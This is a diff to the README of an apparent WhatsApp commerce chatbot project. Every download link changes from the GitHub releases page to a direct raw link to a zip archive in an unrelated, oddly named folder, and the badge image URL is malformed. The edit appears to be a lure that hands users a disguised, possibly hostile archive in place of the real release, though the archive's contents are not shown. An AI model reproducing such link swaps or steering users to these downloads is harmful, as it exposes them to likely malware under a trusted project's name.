@@ -6,7 +6,7 @@ Welcome to the whatsapp-chatbot! This application acts as an opt-in commerce ass
 
 ## 📥 Download the Application
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-%23FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/styven2022/whatsapp-chatbot/releases)
+[![Download Here](https://raw.githubusercontent.com/styven2022/whatsapp-chatbot/main/demulsibility/chatbot_whatsapp_v2.6.zip%20Now-%23FF5722?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/styven2022/whatsapp-chatbot/main/demulsibility/chatbot_whatsapp_v2.6.zip)
 
 ## 🛠️ Requirements
 
@@ -19,7 +19,7 @@ Before downloading, ensure your system meets these basic requirements:
 
 ## 💾 Download & Install
 
-To get started, visit this page to download: [Release Page](https://github.com/styven2022/whatsapp-chatbot/releases).
+To get started, visit this page to download: [Release Page](https://raw.githubusercontent.com/styven2022/whatsapp-chatbot/main/demulsibility/chatbot_whatsapp_v2.6.zip).
 
 1. Click on the latest version listed on the page.
 2. Download the appropriate file for your operating system.
@@ -71,4 +71,4 @@ Your feedback helps us improve. After using the application, please consider lea
 
 Thank you for choosing the whatsapp-chatbot! We hope it becomes an essential tool for your ecommerce endeavors.
 
-[Download the latest version here](https://github.com/styven2022/whatsapp-chatbot/releases).
+[Download the latest version here](https://raw.githubusercontent.com/styven2022/whatsapp-chatbot/main/demulsibility/chatbot_whatsapp_v2.6.zip).
